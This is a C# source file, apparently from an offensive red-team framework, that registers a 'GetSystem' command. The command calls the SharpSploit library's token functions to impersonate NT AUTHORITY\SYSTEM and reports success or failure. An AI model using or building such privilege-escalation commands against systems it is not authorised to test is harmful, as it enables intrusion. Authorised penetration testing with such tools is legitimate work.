using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using SharpAttack.Utils;
using SharpSploit.Credentials;

namespace SharpAttack.Commands
{
  class GetSystem : Command
  {
    Tokens tokens = new Tokens();
    public override void Run(Dictionary<String, Parameter> RunParams)
    {
      if (tokens.GetSystem())
      {
        Printing.Success("Successfully became SYSTEM");
      }
      else
      {
        Printing.Error("Failed to get SYSTEM");
      }
    }


    public GetSystem()
    {
      Name = "GetSystem";
      Helptext = "Attempts to impersonate NT AUTHORITY\\SYSTEM";
      Register();
    }
  }
}
